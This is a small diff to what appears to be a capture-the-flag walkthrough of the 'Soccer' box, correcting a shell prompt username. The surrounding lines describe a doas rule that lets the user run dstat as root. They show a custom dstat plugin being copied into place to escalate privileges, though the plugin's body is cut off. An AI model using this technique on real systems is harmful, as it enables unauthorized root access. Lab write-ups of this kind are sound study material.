@@ -248,7 +248,7 @@ permit nopass player as root cmd /usr/bin/dstat
 There's dstat on the box, and because of the doas config we can execute it as root   
 This means it can be used for privec as mentionned [here](https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/#dstat)
 ```bash
-sqlyer@soccer:/usr/local/share/dstat$ cp /dev/shm/dstat_newt.py .
+player@soccer:/usr/local/share/dstat$ cp /dev/shm/dstat_newt.py .
 player@soccer:/usr/local/share/dstat$ cat dstat_newt.py
 import os
 
